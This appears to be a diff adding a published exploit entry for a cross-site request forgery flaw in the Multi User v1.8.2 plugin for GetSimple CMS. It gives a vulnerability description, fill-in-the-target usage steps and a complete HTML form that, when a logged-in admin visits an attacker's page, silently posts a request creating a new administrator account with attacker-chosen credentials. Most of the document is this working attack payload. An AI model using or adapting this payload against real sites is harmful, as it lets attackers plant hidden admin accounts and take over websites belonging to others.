@@ -1,0 +1,33 @@
+# Exploit Title: GetSimple CMS Plugin Multi User v1.8.2 - Cross-Site Request Forgery (Add Admin)
+# Exploit Author: Bobby Cooke (boku) & Adeeb Shah (@hyd3sec)
+# Date: August 2020-08-12
+# Vendor Homepage: http://get-simple.info/extend/plugin/multi-user/133/
+# Software Link: http://get-simple.info/extend/export/960/133/multi-user.zip
+# Version: 1.8.2
+# Tested On: Windows 10 Pro + XAMPP
+# CWE-352: Cross-Site Request Forgery (CSRF)
+# Vulnerability Description:
+#   Cross-Site Request Forgery (CSRF) vulnerability in Multi User v1.8.2 plugin for GetSimple CMS allows remote attackers to add an Admin user via authenticated admin visiting a third-party site.
+
+## Usage: 
++ Change <IP||DOMAIN> to target IP address or domain name
++ Change <ADMIN> to target username
++ Change <PASSWORD> to target password
+
+## CSRF POST Form Method
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://<IP||DOMAIN>/admin/load.php?id=user-managment" method="POST">
+      <input type="hidden" name="usernamec" value="<ADMIN>" />
+      <input type="hidden" name="useremail" value="ADMIN&#64;DOMAIN&#46;LOCAL" />
+      <input type="hidden" name="ntimezone" value="" />
+      <input type="hidden" name="userlng" value="en&#95;US" />
+      <input type="hidden" name="userpassword" value="<PASSWORD>" />
+      <input type="hidden" name="usereditor" value="1" />
+      <input type="hidden" name="Landing" value="" />
+      <input type="hidden" name="add&#45;user" value="Add&#32;New&#32;User" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
